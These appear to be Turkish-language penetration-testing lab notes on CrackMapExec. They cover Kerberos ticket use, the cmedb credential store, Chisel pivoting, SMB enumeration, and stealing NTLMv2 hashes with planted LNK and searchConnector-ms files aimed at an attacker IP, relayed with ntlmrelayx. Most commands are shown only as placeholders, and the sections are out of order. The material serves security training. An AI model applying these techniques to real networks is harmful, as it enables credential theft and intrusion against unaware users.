Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

